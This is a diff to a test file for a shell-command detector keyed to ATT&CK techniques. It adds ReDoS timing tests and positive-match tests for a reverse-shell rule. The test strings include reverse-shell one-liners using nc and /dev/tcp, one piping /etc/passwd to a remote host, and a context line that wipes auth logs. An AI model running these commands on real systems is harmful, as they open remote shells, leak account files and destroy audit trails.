@@ -136,3 +136,42 @@ def test_authorized_keys_command_matches_t1098() -> None:
 def test_indicator_removal_log_truncation() -> None:
     matched = {r.id for r in TECHNIQUES if r.matches("rm -rf /var/log/auth.log")}
     assert "T1070" in matched
+
+
+# ---------------------------------------------------------------------------
+# ReDoS hardening (audit L5)
+# ---------------------------------------------------------------------------
+
+
+def _t1059_004() -> TechniqueRule:
+    return next(r for r in TECHNIQUES if r.id == "T1059.004")
+
+
+def test_t1059_004_command_patterns_are_not_redos() -> None:
+    """Neither T1059.004 gap quantifier may backtrack quadratically.
+
+    The patterns ran `\\|.*?` and `-[ic].*?` over attacker command text;
+    both re-anchored at every pipe / `bash -i` occurrence. A non-shell
+    head (so matches() reaches command_patterns) plus a long run pinned
+    the matcher.
+    """
+    import time
+
+    rule = _t1059_004()
+    payloads = [
+        "ls " + "|" * 50000 + " x",  # pattern 1: pipes, no keyword
+        "echo " + "bash -i " * 6000 + "x",  # pattern 2: many `bash -i`, no target
+    ]
+    for payload in payloads:
+        start = time.perf_counter()
+        rule.matches(payload)
+        elapsed = time.perf_counter() - start
+        assert elapsed < 0.1, f"matches took {elapsed * 1000:.0f}ms (ReDoS)"
+
+
+def test_t1059_004_still_matches_real_reverse_shells() -> None:
+    rule = _t1059_004()
+    assert rule.matches("cat /etc/passwd | nc 10.0.0.1 4444") is True
+    assert rule.matches("env bash -i >& /dev/tcp/10.0.0.1/4444 0>&1") is True
+    assert rule.matches("env sh -c 'exec 5<>/dev/tcp/1.2.3.4/443'") is True
+    assert rule.matches("ls -la") is False
